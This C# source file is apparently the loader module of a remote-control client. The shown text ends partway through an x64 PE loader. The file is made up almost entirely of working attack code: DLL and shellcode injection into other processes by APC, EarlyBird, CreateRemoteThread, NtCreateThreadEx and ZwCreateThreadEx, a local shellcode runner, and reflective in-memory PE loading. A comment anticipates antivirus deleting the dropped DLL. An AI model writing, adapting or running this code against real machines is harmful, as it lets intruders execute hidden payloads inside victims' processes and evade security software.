using NAudio.Wave;
using Plugin.Abstractions48;
using System;
using System.CodeDom;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Windows.Forms.VisualStyles;

namespace winClient48
{
    internal class clsfnLoader
    {
        public clsfnLoader()
        {

        }

        #region DLL Injection

        /// <summary>
        /// Save file bytes into a temp file and return the file path.
        /// </summary>
        /// <param name="abDllBytes">DLL file bytes.</param>
        /// <returns>Full path of DLL file.</returns>
        /// <exception cref="Exception">File does not exist.</exception>
        private string fnSaveDll(byte[] abDllBytes)
        {
            string szTempDllPath = clsEZData.fnGetNewTempFilePath("dll");
            File.WriteAllBytes(szTempDllPath, abDllBytes);
            if (!File.Exists(szTempDllPath))
                throw new Exception("Write file failed: " + szTempDllPath);

            return szTempDllPath;
        }

        /// <summary>
        /// APC DLL injection.
        /// </summary>
        /// <param name="nProcID">Process ID.</param>
        /// <param name="abDllBytes">DLL file bytes.</param>
        /// <returns></returns>
        public (int nCode, string szMsg) fnApcDLL(int nProcID, byte[] abDllBytes)
        {
            int nCode = 0;
            string szMsg = string.Empty;

            try
            {
                //Throw an exception if not found.
                Process proc = Process.GetProcessById(nProcID);

                string szDllPath = fnSaveDll(abDllBytes);

                //Your DLL file might be deleted by an anti-virus.
                if (!File.Exists(szDllPath))
                    throw new Exception("File not found: " + szDllPath);

                IntPtr hProc = WinAPI.OpenProcess((uint)WinAPI.ProcessAccessFlags.All, false, nProcID);
                if (IntPtr.Zero == hProc)
                    throw new Exception($"OpenPrcess() failed. Error code: {WinAPI.GetLastError()}");

                IntPtr pAddrLoadLibrary = WinAPI.GetProcAddress(WinAPI.GetModuleHandle("kernel32.dll"), "LoadLibraryW");
                if (IntPtr.Zero == pAddrLoadLibrary)
                    throw new Exception($"GetProcessAddress() failed. Error code: {WinAPI.GetLastError()}");

                IntPtr pAllocMemAddr = WinAPI.VirtualAllocEx(
                    hProc,
                    IntPtr.Zero,
                    (uint)((szDllPath.Length + 1) * Marshal.SizeOf(typeof(char))),
                    WinAPI.MEM_COMMIT | WinAPI.MEM_RESERVE,
                    WinAPI.PAGE_READWRITE
                );
                if (IntPtr.Zero == pAllocMemAddr)
                    throw new Exception($"Allocating memory space failed. Error code: {WinAPI.GetLastError()}");

                uint nWritten = 0;
                WinAPI.WriteProcessMemory(
                    hProc,
                    pAllocMemAddr,
                    Encoding.Unicode.GetBytes(szDllPath),
                    (uint)((szDllPath.Length + 1) * Marshal.SizeOf(typeof(char))),
                    out nWritten
                );

                foreach (ProcessThread thd in proc.Threads)
                {
                    IntPtr hThread = WinAPI.OpenThread((int)WinAPI.ThreadAccess.QUERY_INFORMATION, false, (uint)thd.Id);
                    IntPtr ptr = WinAPI.QueueUserAPC(pAddrLoadLibrary, hThread, pAllocMemAddr);
                    if (IntPtr.Zero == ptr)
                        throw new Exception($"QueueUserAPC() failed. Error code: {WinAPI.GetLastError()}");
                }

                nCode = 1;
                szMsg = "APC injection is finished. Please check!";
            }
            catch (Exception ex)
            {
                szMsg = ex.Message;
            }

            return (nCode, szMsg);
        }

        /// <summary>
        /// EarlyBird DLL injection.
        /// </summary>
        /// <param name="nProcID">Process ID.</param>
        /// <param name="abDllBytes">DLL file bytes.</param>
        /// <returns></returns>
        public (int nCode, string szMsg) fnEarlyBirdDll(int nProcID, byte[] abDllBytes)
        {
            int nCode = 0;
            string szMsg = string.Empty;

            try
            {
                //Throw an exception if not found.
                Process proc = Process.GetProcessById(nProcID);

                string szDllPath = fnSaveDll(abDllBytes);
                if (!File.Exists(szDllPath))
                    throw new Exception("DLL file not found: " + szDllPath);

                WinAPI.STARTUPINFO si = new WinAPI.STARTUPINFO();
                si.cb = Marshal.SizeOf(typeof(WinAPI.STARTUPINFO));
                WinAPI.PROCESS_INFORMATION pi = new WinAPI.PROCESS_INFORMATION();

                string szExePath = proc.MainModule.FileName;
                if (!File.Exists(szExePath))
                    throw new Exception("Executable not found: " + szExePath);

                StringBuilder cmdLine = new StringBuilder();
                cmdLine.Append("\"");
                cmdLine.Append(szExePath);
                cmdLine.Append("\"");

                bool success = WinAPI.CreateProcess(
                    null,
                    cmdLine,
                    IntPtr.Zero,
                    IntPtr.Zero,
                    false,
                    WinAPI.CreationFlags.CREATE_SUSPENDED,
                    IntPtr.Zero,
                    null,
                    ref si,
                    out pi
                );

                if (!success)
                    throw new Exception($"Create process failed. Error code: {WinAPI.GetLastError()}");

                IntPtr pAddrLoadLibrary = WinAPI.GetProcAddress(WinAPI.GetModuleHandle("kernel32.dll"), "LoadLibraryW");
                if (IntPtr.Zero == pAddrLoadLibrary)
                    throw new Exception($"GetProcessAddress() failed. Error code: {WinAPI.GetLastError()}");

                IntPtr pAllocMemAddr = WinAPI.VirtualAllocEx(
                    pi.hProcess,
                    IntPtr.Zero,
                    (uint)((szDllPath.Length + 1) * Marshal.SizeOf(typeof(char))),
                    WinAPI.MEM_COMMIT | WinAPI.MEM_RESERVE,
                    WinAPI.PAGE_READWRITE
                );
                if (IntPtr.Zero == pAllocMemAddr)
                    throw new Exception($"Allocating memory space failed. Error code: {WinAPI.GetLastError()}");

                uint nWritten = 0;
                WinAPI.WriteProcessMemory(
                    pi.hProcess,
                    pAllocMemAddr,
                    Encoding.Unicode.GetBytes(szDllPath),
                    (uint)((szDllPath.Length + 1) * Marshal.SizeOf(typeof(char))),
                    out nWritten
                );
                if (0 == nWritten)
                    throw new Exception($"WriteProcessMemory() failed. Error code: {WinAPI.GetLastError()}");

                IntPtr ptr = WinAPI.QueueUserAPC(pAddrLoadLibrary, pi.hThread, pAllocMemAddr);
                if (IntPtr.Zero == ptr)
                    throw new Exception($"QueueUserAPC() failed. Error code: {WinAPI.GetLastError()}");

                uint nRet = WinAPI.ResumeThread(pi.hThread);
                if (nRet == 0xFFFFFFFF)
                    throw new Exception($"EarlyBird injection failed. Error code: {WinAPI.GetLastError()}");

                nCode = 1;
                szMsg = "EarlyBird injection is finished. Please check!";

            }
            catch (Exception ex)
            {
                szMsg = ex.Message;
            }

            return (nCode, szMsg);
        }

        /// <summary>
        /// CreateRemoteThread DLL injection.
        /// </summary>
        /// <param name="nProc">Process ID.</param>
        /// <param name="abDllBytes">DLL file bytes.</param>
        /// <returns></returns>
        public (int nCode, string szMsg) fnRemoteCreateThreadDLL(int nProc, byte[] abDllBytes)
        {
            int nCode = 0;
            string szMsg = string.Empty;

            try
            {
                Process proc = Process.GetProcessById(nProc);
                if (proc == null)
                    throw new Exception($"Cannot get process with ID: {nProc}");

                IntPtr hProc = WinAPI.OpenProcess((uint)WinAPI.ProcessAccessFlags.All, false, nProc);
                string szTempDllPath = clsEZData.fnGetNewTempFilePath("dll");
                File.WriteAllBytes(szTempDllPath, abDllBytes);
                if (!File.Exists(szTempDllPath))
                    throw new Exception("Write file failed: " + szTempDllPath);

                IntPtr pLibraryAddr = WinAPI.GetProcAddress(WinAPI.GetModuleHandle("kernel32.dll"), "LoadLibraryA");
                if (IntPtr.Zero == pLibraryAddr)
                    throw new Exception($"GetProcAddress() failed. Error code: {WinAPI.GetLastError()}");
                
                IntPtr pAllocMemAddr = WinAPI.VirtualAllocEx(hProc, IntPtr.Zero, (uint)((szTempDllPath.Length + 1) * Marshal.SizeOf(typeof(char))), WinAPI.MEM_COMMIT | WinAPI.MEM_RESERVE, WinAPI.PAGE_READWRITE);
                if (IntPtr.Zero == pAllocMemAddr)
                    throw new Exception($"Allocating memory space failed. Error code: {WinAPI.GetLastError()}");

                uint nWritten;
                WinAPI.WriteProcessMemory(hProc, pAllocMemAddr, Encoding.ASCII.GetBytes(szTempDllPath), (uint)((szTempDllPath.Length + 1) * Marshal.SizeOf(typeof(char))), out nWritten);
                if (0 == nWritten)
                    throw new Exception($"Write process memory failed. Error code: {WinAPI.GetLastError()}");

                IntPtr hThread = IntPtr.Zero;
                WinAPI.CreateRemoteThread(hProc, IntPtr.Zero, 0, pLibraryAddr, pAllocMemAddr, 0, out hThread);
                if (IntPtr.Zero == hThread)
                    throw new Exception($"CreateRemoteThread() failed. Error code: {WinAPI.GetLastError()}");

                szMsg = "CreateRemoteThread injection is finished. Please check!";
                nCode = 1;
            }
            catch (Exception ex)
            {
                szMsg = ex.Message;
            }

            return (nCode, szMsg);
        }

        /// <summary>
        /// NtCreateThreadEx DLL injection.
        /// </summary>
        /// <param name="nProcId">Process ID.</param>
        /// <param name="abDllBytes">DLL file bytes.</param>
        /// <returns></returns>
        public (int nCode, string szMsg) fnNtCreateThreadExDll(int nProcId, byte[] abDllBytes)
        {
            int nCode = 0;
            string szMsg = string.Empty;

            try
            {
                Process proc = Process.GetProcessById(nProcId);
                if (null == proc)
                    throw new Exception($"Cannot find process with ID: {nProcId}");

                string szDllPath = fnSaveDll(abDllBytes);
                IntPtr hProc = WinAPI.OpenProcess(WinAPI.PROCESS_ALL_ACCESS, false, nProcId);
                if (IntPtr.Zero == hProc)
                    throw new Exception($"OpenProcess() failed. Error code: {WinAPI.GetLastError()}");
                
                IntPtr pAddrLoadLibrary = WinAPI.GetProcAddress(WinAPI.GetModuleHandle("kernel32.dll"), "LoadLibraryA");
                IntPtr pAddrRemoteMemory = WinAPI.VirtualAllocEx(hProc, IntPtr.Zero, (uint)(szDllPath.Length + 1), 0x3000, 0x40);

                byte[] abDllPath = Encoding.ASCII.GetBytes(szDllPath);
                if (!WinAPI.WriteProcessMemory(hProc, pAddrRemoteMemory, abDllPath, (uint)abDllPath.Length, out _))
                    throw new Exception($"WriteProcessMemory() failed. Error code: {WinAPI.GetLastError()}");

                IntPtr hThread = IntPtr.Zero;
                uint nResult = WinAPI.NtCreateThreadEx(out hThread, 0x1FFFFF, IntPtr.Zero, hProc, pAddrLoadLibrary, pAddrRemoteMemory, false, 0, 0, 0, IntPtr.Zero);
                if (0 != nResult)
                    throw new Exception($"NtCreateThreadEx() failed. Error: {WinAPI.GetLastError()}");

                nCode = 1;
                szMsg = "NTCreateThreadEx injection is finished. Please checked!";
            }
            catch (Exception ex)
            {
                szMsg = ex.Message;
            }

            return (nCode, szMsg);
        }

        /// <summary>
        /// ZwCreateThreadEx DLL injection.
        /// </summary>
        /// <param name="nProcId">Process ID.</param>
        /// <param name="abDllBytes">DLL file bytes.</param>
        /// <returns></returns>
        public (int nCode, string szMsg) fnZwCreateThreadExDll(int nProcId, byte[] abDllBytes)
        {
            int nCode = 0;
            string szMsg = string.Empty;

            try
            {
                //Throw an exception if the process does not exist.
                Process.GetProcessById(nProcId);

                IntPtr hProc = WinAPI.OpenProcess(
                    WinAPI.PROCESS_CREATE_THREAD | WinAPI.PROCESS_QUERY_INFORMATION | WinAPI.PROCESS_VM_OPERATION | WinAPI.PROCESS_VM_WRITE | WinAPI.PROCESS_VM_READ, 
                    false, 
                    nProcId
                );
                if (IntPtr.Zero == hProc)
                    throw new Exception($"OpenProcess() failed. Error code: {WinAPI.GetLastError()}");

                string szDllPath = fnSaveDll(abDllBytes);
                byte[] abDllPath = Encoding.Unicode.GetBytes(szDllPath);

                IntPtr lpBaseAddress = WinAPI.VirtualAllocEx(
                    hProc, 
                    IntPtr.Zero, 
                    (uint)abDllPath.Length, 
                    WinAPI.MEM_COMMIT | WinAPI.MEM_RESERVE, WinAPI.PAGE_EXECUTE_READWRITE)
                ;
                if (IntPtr.Zero == lpBaseAddress)
                    throw new Exception($"VirtualAllocEx() failed. Error code: {WinAPI.GetLastError()}");

                uint nWritten;
                if (!WinAPI.WriteProcessMemory(hProc, lpBaseAddress, abDllPath, (uint)((abDllPath.Length + 1) * Marshal.SizeOf(typeof(char))), out nWritten))
                    throw new Exception($"Write process memory failed. Error code: {WinAPI.GetLastError()}");

                IntPtr pAddrLoadLibrary = WinAPI.GetProcAddress(WinAPI.GetModuleHandle("kernel32.dll"), "LoadLibraryW");
                if (IntPtr.Zero == pAddrLoadLibrary)
                    throw new Exception($"GetProcAddress() failed. Error code: {WinAPI.GetLastError()}");

                IntPtr hThread;
                if (0 != WinAPI.ZwCreateThreadEx(
                    out hThread,
                    0x1FFFFF,
                    IntPtr.Zero,
                    hProc,
                    pAddrLoadLibrary,
                    lpBaseAddress, 0, 0, 0, 0, IntPtr.Zero)
                )
                    throw new Exception($"ZwCreateThreadEx() failed. Error code: {WinAPI.GetLastError()}");

                szMsg = "ZwCreateThreadEx Injection is finished. Please check!";
                nCode = 1;
            }
            catch (Exception ex)
            {
                szMsg = ex.Message;
            }

            return (nCode, szMsg);
        }

        #endregion

        #region Shellcode Injection

        /// <summary>
        /// APC shellcode injection.
        /// </summary>
        /// <param name="nProcId">Process ID.</param>
        /// <param name="abShellCode">Shellcode bytes.</param>
        /// <returns></returns>
        public (int nCode, string szMsg) fnApcSC(int nProcId, byte[] abShellCode)
        {
            int nCode = 0;
            string szMsg = string.Empty;

            try
            {
                //Throw an exception if not found.
                Process proc = Process.GetProcessById(nProcId);

                IntPtr hProc = WinAPI.OpenProcess((uint)WinAPI.ProcessAccessFlags.All, false, nProcId);
                if (IntPtr.Zero == hProc)
                    throw new Exception($"OpenPrcess() failed. Error code: {WinAPI.GetLastError()}");

                IntPtr pAllocMemAddr = WinAPI.VirtualAllocEx(
                    hProc,
                    IntPtr.Zero,
                    (uint)abShellCode.Length,
                    WinAPI.MEM_COMMIT | WinAPI.MEM_RESERVE,
                    WinAPI.PAGE_EXECUTE_READWRITE
                );
                if (IntPtr.Zero == pAllocMemAddr)
                    throw new Exception($"Allocating memory space failed. Error code: {WinAPI.GetLastError()}");

                uint nWritten = 0;
                WinAPI.WriteProcessMemory(
                    hProc,
                    pAllocMemAddr,
                    abShellCode,
                    (uint)abShellCode.Length,
                    out nWritten
                );

                uint nOldProtect = 0;
                bool bResult = WinAPI.VirtualProtectEx(hProc, pAllocMemAddr, abShellCode.Length, WinAPI.PAGE_EXECUTE_READWRITE, out nOldProtect);
                if (!bResult)
                    throw new Exception($"VirtualProtectEx() failed. Error code: {WinAPI.GetLastError()}");

                int nAccess = (int)(WinAPI.ThreadAccess.SET_CONTEXT | WinAPI.ThreadAccess.GET_CONTEXT | WinAPI.ThreadAccess.SUSPEND_RESUME);

                foreach (ProcessThread thd in proc.Threads)
                {
                    IntPtr hThread = WinAPI.OpenThread(nAccess, false, (uint)thd.Id);
                    IntPtr ptr = WinAPI.QueueUserAPC(pAllocMemAddr, hThread, IntPtr.Zero);
                    if (IntPtr.Zero == ptr)
                        throw new Exception($"QueueUserAPC() failed. Error code: {WinAPI.GetLastError()}");
                }

                nCode = 1;
                szMsg = "APC injection is finished. Please check.";
            }
            catch (Exception ex)
            {
                szMsg = ex.Message;
            }

            return (nCode, szMsg);
        }

        /// <summary>
        /// EarlyBird shellcode injection.
        /// </summary>
        /// <param name="nProcId">Process ID.</param>
        /// <param name="abShellCode">Shellcode bytes.</param>
        /// <returns></returns>
        public (int nCode, string szMsg) fnEarlyBirdSC(int nProcId, byte[] abShellCode)
        {
            int nCode = 0;
            string szMsg = string.Empty;

            try
            {
                Process proc = Process.GetProcessById(nProcId);
                if (proc == null)
                    throw new Exception($"Cannot find process with ID: {nProcId}");

                string szExePath = proc.MainModule.FileName;
                WinAPI.STARTUPINFO si = new WinAPI.STARTUPINFO();
                si.cb = Marshal.SizeOf(typeof(WinAPI.STARTUPINFO));
                WinAPI.PROCESS_INFORMATION pi = new WinAPI.PROCESS_INFORMATION();

                StringBuilder cmdLine = new StringBuilder($"\"{szExePath}\"");

                bool bRet = WinAPI.CreateProcess(
                    szExePath,
                    cmdLine,
                    IntPtr.Zero,
                    IntPtr.Zero,
                    false,
                    WinAPI.CreationFlags.CREATE_SUSPENDED,
                    IntPtr.Zero,
                    null,
                    ref si,
                    out pi
                );

                if (!bRet)
                    throw new Exception($"CreateProcessW() failed. Error code: {WinAPI.GetLastError()}");

                IntPtr hProc = pi.hProcess;
                IntPtr hThread = pi.hThread;

                IntPtr resultPtr = WinAPI.VirtualAllocEx(
                    pi.hProcess,
                    IntPtr.Zero,
                    (uint)abShellCode.Length,
                    WinAPI.MEM_COMMIT | WinAPI.MEM_RESERVE,
                    WinAPI.PAGE_EXECUTE_READWRITE
                );
                if (IntPtr.Zero == resultPtr)
                    throw new Exception($"VirtualAllocEx() failed. Error code: {WinAPI.GetLastError()}");

                uint nWritten;
                bool resultBool = WinAPI.WriteProcessMemory(pi.hProcess, resultPtr, abShellCode, (uint)abShellCode.Length, out nWritten);
                if (!resultBool)
                    throw new Exception($"WriteProcessMemory() failed. Error code: {WinAPI.GetLastError()}");

                IntPtr ptr = WinAPI.QueueUserAPC(resultPtr, pi.hThread, IntPtr.Zero);
                if (IntPtr.Zero == ptr)
                    throw new Exception($"QueueUserAPC() failed. Error code: {WinAPI.GetLastError()}");

                uint nRet = WinAPI.ResumeThread(pi.hThread);
                if (nRet == 0xFFFFFFFF)
                    throw new Exception($"EarlyBird injection failed. Error code: {WinAPI.GetLastError()}");

                nCode = 1;
                szMsg = "EarlyBird injection is finished. Please check.";
            }
            catch (Exception ex)
            {
                szMsg = ex.Message;
            }

            return (nCode, szMsg);
        }

        /// <summary>
        /// CreateRemoteThread shellcode injection.
        /// </summary>
        /// <param name="nProcId">Process ID.</param>
        /// <param name="abShellCode">Shellcode bytes.</param>
        /// <returns></returns>
        public (int nCode, string szMsg) fnCreateRemoteThreadSC(int nProcId, byte[] abShellCode)
        {
            int nCode = 0;
            string szMsg = string.Empty;

            try
            {
                Process proc = Process.GetProcessById(nProcId);
                if (proc == null)
                    throw new Exception($"Cannot find process with ID: {nProcId}");

                int nShellcodeSize = abShellCode.Length;
                uint bytesWritten = 0;

                IntPtr procHandle = WinAPI.OpenProcess((uint)WinAPI.ProcessAccessFlags.All, false, nProcId);
                IntPtr init = WinAPI.VirtualAllocEx(procHandle, IntPtr.Zero, (uint)nShellcodeSize, WinAPI.MEM_COMMIT, WinAPI.PAGE_EXECUTE_READWRITE);
                WinAPI.WriteProcessMemory(procHandle, init, abShellCode, (uint)nShellcodeSize, out bytesWritten);
                if (bytesWritten == 0)
                    throw new Exception($"WriteProcessMemory() failed. Error code: {WinAPI.GetLastError()}");

                uint oldProtect;
                WinAPI.VirtualProtectEx(procHandle, init, abShellCode.Length, WinAPI.PAGE_EXECUTE_READ, out oldProtect);

                IntPtr hThread = IntPtr.Zero;
                WinAPI.CreateRemoteThread(procHandle, IntPtr.Zero, 0, init, IntPtr.Zero, 0, out hThread);
                if (IntPtr.Zero == hThread)
                    throw new Exception($"CreateRemoteThread() failed. Error code: {WinAPI.GetLastError()}");

                szMsg = "CreateRemoteThread injection is finished. Please check!";
                nCode = 1;
            }
            catch (Exception ex)
            {
                szMsg = ex.Message;
            }

            return (nCode, szMsg);
        }

        /// <summary>
        /// NtCreateThreadEx shellcode injection.
        /// </summary>
        /// <param name="nProcId">Process ID.</param>
        /// <param name="abShellCode">Shellcode bytes.</param>
        /// <returns></returns>
        public (int nCode, string szMsg) fnNtCreateThreadExSC(int nProcId, byte[] abShellCode)
        {
            int nCode = 0;
            string szMsg = string.Empty;

            try
            {
                //Throw an exception if not found.
                Process.GetProcessById(nProcId);

                IntPtr hProc = WinAPI.OpenProcess(WinAPI.PROCESS_ALL_ACCESS, false, nProcId);
                if (IntPtr.Zero == hProc)
                    throw new Exception($"OpenProcess() failed. Error code: {WinAPI.GetLastError()}");

                IntPtr pAddrAlloc = WinAPI.VirtualAllocEx(
                    hProc, IntPtr.Zero, 
                    (uint)abShellCode.Length, 
                    WinAPI.MEM_COMMIT | WinAPI.MEM_RESERVE, 
                    WinAPI.PAGE_EXECUTE_READWRITE
                );
                if (IntPtr.Zero == pAddrAlloc)
                    throw new Exception($"VirtualAllocEX() failed. Error code: {WinAPI.GetLastError()}");

                uint nWritten = 0;
                WinAPI.WriteProcessMemory(hProc, pAddrAlloc, abShellCode, (uint)abShellCode.Length, out nWritten);
                if (0 == nWritten)
                    throw new Exception($"WriteProcessMemory() failed. Error code: {WinAPI.GetLastError()}");

                IntPtr hThread = IntPtr.Zero;
                uint nResult = WinAPI.NtCreateThreadEx(out hThread, 0x1FFFFF, IntPtr.Zero, hProc, pAddrAlloc, IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero);
                if (nResult != 0 || IntPtr.Zero == hThread)
                    throw new Exception($"NtCreateThreadEx() failed. Error code: {WinAPI.GetLastError()}");

                nCode = 1;
                szMsg = "NtCreateThreadExSC injection is finished. Please check!";
            }
            catch (Exception ex)
            {
                szMsg = ex.Message;
            }

            return (nCode, szMsg);
        }

        /// <summary>
        /// ZwCreateThreadEx shellcode injection.
        /// </summary>
        /// <param name="nProcId">Process ID.</param>
        /// <param name="abShellCode">Shellcode bytes.</param>
        /// <returns></returns>
        public (int nCode, string szMsg) fnZwCreateThreadExSC(int nProcId, byte[] abShellCode)
        {
            int nCode = 0;
            string szMsg = string.Empty;

            try
            {
                IntPtr hProc = WinAPI.OpenProcess((uint)WinAPI.ProcessAccessFlags.All, false, nProcId);
                if (IntPtr.Zero == hProc)
                    throw new Exception($"OpenProcess() failed. Error code: {WinAPI.GetLastError()}");

                IntPtr pAddrAlloc = WinAPI.VirtualAllocEx(
                    hProc, IntPtr.Zero,
                    (uint)abShellCode.Length,
                    WinAPI.MEM_COMMIT | WinAPI.MEM_RESERVE,
                    WinAPI.PAGE_EXECUTE_READWRITE
                );
                if (IntPtr.Zero == pAddrAlloc)
                    throw new Exception($"VirtualAllocEX() failed. Error code: {WinAPI.GetLastError()}");

                uint nWritten = 0;
                WinAPI.WriteProcessMemory(hProc, pAddrAlloc, abShellCode, (uint)abShellCode.Length, out nWritten);
                if (0 == nWritten)
                    throw new Exception($"WriteProcessMemory() failed. Error code: {WinAPI.GetLastError()}");

                IntPtr hThread = IntPtr.Zero;
                uint nResult = WinAPI.ZwCreateThreadEx(out hThread, 0x1FFFFF, IntPtr.Zero, hProc, pAddrAlloc, IntPtr.Zero, 0, 0, 0, 0, IntPtr.Zero);
                if (nResult != 0 || IntPtr.Zero == hThread)
                    throw new Exception($"ZwCreateThreadEx() failed. Error code; {WinAPI.GetLastError()}");

                nCode = 1;
                szMsg = "ZwCreateThreadEx injection is finished. Please check!";
            }
            catch (Exception ex)
            {
                szMsg = ex.Message;
            }

            return (nCode, szMsg);
        }

        #endregion

        #region Loader

        /// <summary>
        /// DLL loader.
        /// </summary>
        /// <param name="abDllBytes"></param>
        /// <returns></returns>
        public (int nCode, string szMsg) fnLdrLoadDll(byte[] abDllBytes)
        {
            int nCode = 0;
            string szMsg = string.Empty;

            try
            {
                string szDllPath = fnSaveDll(abDllBytes);
                if (!File.Exists(szDllPath))
                    throw new Exception("DLL file not found: " + szDllPath);

                WinAPI.UnicodeString uModuleName = new WinAPI.UnicodeString();
                WinAPI.RtlInitUnicodeString(ref uModuleName, szDllPath);

                IntPtr hModule = IntPtr.Zero;
                WinAPI.LdrLoadDll(null, 0, ref uModuleName, out hModule);
                if (IntPtr.Zero == hModule)
                    throw new Exception($"LdrLoadDll() failed. Error code: {WinAPI.GetLastError()}");

                nCode = 1;
                szMsg = "Load DLL completed. Please check!";
            }
            catch (Exception ex)
            {
                szMsg = ex.Message;
            }

            return (nCode, szMsg);
        }

        /// <summary>
        /// Shellcode loader.
        /// </summary>
        /// <param name="abShellCode"></param>
        /// <returns></returns>
        public (int nCode, string szMsg) fnShellCodeLoader(byte[] abShellCode)
        {
            int nCode = 0;
            string szMsg = string.Empty;

            try
            {
                IntPtr funcAddr = WinAPI.VirtualAlloc(
                    IntPtr.Zero,
                    (uint)abShellCode.Length,
                    WinAPI.MEM_COMMIT,
                    WinAPI.PAGE_EXECUTE_READWRITE
                );
                if (IntPtr.Zero == funcAddr)
                    throw new Exception($"VirtualAlloc() failed. Error code: {WinAPI.GetLastError()}");

                Marshal.Copy(abShellCode, 0, (IntPtr)(funcAddr), abShellCode.Length);

                IntPtr hThread = IntPtr.Zero;
                uint threadId = 0;
                IntPtr pinfo = IntPtr.Zero;

                hThread = WinAPI.CreateThread(IntPtr.Zero, 0, funcAddr, pinfo, 0, out threadId);
                if (IntPtr.Zero == hThread)
                    throw new Exception($"CreateThread() failed. Error code: {WinAPI.GetLastError()}");

                WinAPI.WaitForSingleObject(hThread, 0xFFFFFFFF);

                szMsg = "Load shellcode completed. Please check!";
                nCode = 1;
            }
            catch (Exception ex)
            {
                szMsg = ex.Message;
            }

            return (nCode, szMsg);
        }

        /// <summary>
        /// x86 PE loader.
        /// </summary>
        /// <param name="abFileBytes">x64 PE file bytes.</param>
        /// <returns></returns>
        public (int nCode, string szMsg) fnX86PELoader(byte[] abFileBytes)
        {
            int nCode = 0;
            string szMsg = string.Empty;

            try
            {
                x86PELoader loader = new x86PELoader(abFileBytes);
                if (!loader.Is32Bit)
                    throw new Exception("This loader only supports x86 PE");

                IntPtr imageBase = NativeDeclarations.VirtualAlloc(
                    IntPtr.Zero,
                    loader.OptionalHeader.SizeOfImage,
                    NativeDeclarations.MEM_COMMIT | NativeDeclarations.MEM_RESERVE,
                    NativeDeclarations.PAGE_EXECUTE_READWRITE
                );

                //copy headers
                Marshal.Copy(loader.RawBytes, 0, imageBase, (int)loader.OptionalHeader.SizeOfHeaders);

                //copy sections
                foreach (var sec in loader.Sections)
                {
                    IntPtr dest = IntPtr.Add(imageBase, (int)sec.VirtualAddress);
                    Marshal.Copy(
                        loader.RawBytes,
                        (int)sec.PointerToRawData,
                        dest,
                        (int)sec.SizeOfRawData
                    );
                }

                //relocation
                long delta = imageBase.ToInt64() - loader.OptionalHeader.ImageBase;
                if (delta != 0)
                {
                    var dir1 = loader.OptionalHeader.BaseRelocationTable;
                    if (dir1.Size == 0)
                        throw new Exception("Size is zero!");

                    IntPtr relocBase = IntPtr.Add(imageBase, (int)dir1.VirtualAddress);
                    int offset = 0;

                    while (true)
                    {
                        NativeDeclarations.IMAGE_BASE_RELOCATION block = Marshal.PtrToStructure<NativeDeclarations.IMAGE_BASE_RELOCATION>(IntPtr.Add(relocBase, offset));

                        if (block.SizeOfBlock == 0)
                            break;

                        int count = (int)((block.SizeOfBlock - 8) / 2);
                        IntPtr fixupBase = IntPtr.Add(imageBase, (int)block.VirtualAddress);

                        for (int i = 0; i < count; i++)
                        {
                            ushort value = (ushort)Marshal.ReadInt16(relocBase, offset + 8 + i * 2);

                            ushort type = (ushort)(value >> 12);
                            ushort rva = (ushort)(value & 0xFFF);

                            if (type == 0x3) //IMAGE_REL_BASED_HIGHLOW
                            {
                                IntPtr patch = IntPtr.Add(fixupBase, rva);
                                int original = Marshal.ReadInt32(patch);
                                Marshal.WriteInt32(patch, original + (int)delta);
                            }
                        }

                        offset += (int)block.SizeOfBlock;
                    }
                }

                //imports

                var dir2 = loader.OptionalHeader.ImportTable;
                if (dir2.Size == 0)
                    throw new Exception("Size is zero.");

                int descSize = Marshal.SizeOf<NativeDeclarations.IMAGE_IMPORT_DESCRIPTOR>();
                IntPtr descPtr = IntPtr.Add(imageBase, (int)dir2.VirtualAddress);

                while (true)
                {
                    NativeDeclarations.IMAGE_IMPORT_DESCRIPTOR desc =  Marshal.PtrToStructure<NativeDeclarations.IMAGE_IMPORT_DESCRIPTOR>(descPtr);

                    if (desc.Name == 0) break;

                    string dllName = Marshal.PtrToStringAnsi(IntPtr.Add(imageBase, (int)desc.Name));

                    IntPtr hDll = NativeDeclarations.LoadLibrary(dllName);

                    IntPtr thunkRef = IntPtr.Add(
                        imageBase, 
                        (int)(desc.OriginalFirstThunk != 0 ? desc.OriginalFirstThunk : desc.FirstThunk)
                    );

                    IntPtr funcRef = IntPtr.Add(imageBase, (int)desc.FirstThunk);

                    while (true)
                    {
                        int thunkData = Marshal.ReadInt32(thunkRef);
                        if (thunkData == 0) break;

                        IntPtr funcAddr;

                        if ((thunkData & 0x80000000) != 0)
                        {
                            //ordinal
                            funcAddr = NativeDeclarations.GetProcAddress(hDll, (IntPtr)(thunkData & 0xFFFF));
                        }
                        else
                        {
                            IntPtr namePtr = IntPtr.Add(imageBase, thunkData);
                            string name = Marshal.PtrToStringAnsi(IntPtr.Add(namePtr, 2));
                            funcAddr = NativeDeclarations.GetProcAddress(hDll, name);
                        }

                        Marshal.WriteInt32(funcRef, funcAddr.ToInt32());

                        thunkRef = IntPtr.Add(thunkRef, 4);
                        funcRef = IntPtr.Add(funcRef, 4);
                    }

                    descPtr = IntPtr.Add(descPtr, descSize);
                }

                //Jump to OEP.
                IntPtr entry = IntPtr.Add(imageBase, (int)loader.OptionalHeader.AddressOfEntryPoint);
                IntPtr hThread = NativeDeclarations.CreateThread(IntPtr.Zero, 0, entry, IntPtr.Zero, 0, IntPtr.Zero);
                NativeDeclarations.WaitForSingleObject(hThread, 0xFFFFFFFF);

                nCode = 1;
            }
            catch (Exception ex)
            {
                szMsg = ex.Message;
            }

            return (nCode, szMsg);
        }

        /// <summary>
        /// x64 PE loader.
        /// </summary>
        /// <param name="abFileBytes">x64 PE file bytes.</param>
        /// <returns></returns>
        public (int nCode, string szMsg) fnX64PELoader(byte[] abFileBytes)
        {
            int nCode = 0;
            string szMsg = string.Empty;

            try
            {
                //Acknowledgement: https://github.com/S3cur3Th1sSh1t/Creds/blob/master/Csharp/PEloader.cs

                x64PELoader pe = new x64PELoader(abFileBytes);

                //Console.WriteLine("Preferred Load Address = {0}", pe.OptionalHeader64.ImageBase.ToString("X4"));

                IntPtr codebase = IntPtr.Zero;

                codebase = NativeDeclarations.VirtualAlloc(IntPtr.Zero, pe.OptionalHeader64.SizeOfImage, NativeDeclarations.MEM_COMMIT, NativeDeclarations.PAGE_EXECUTE_READWRITE);

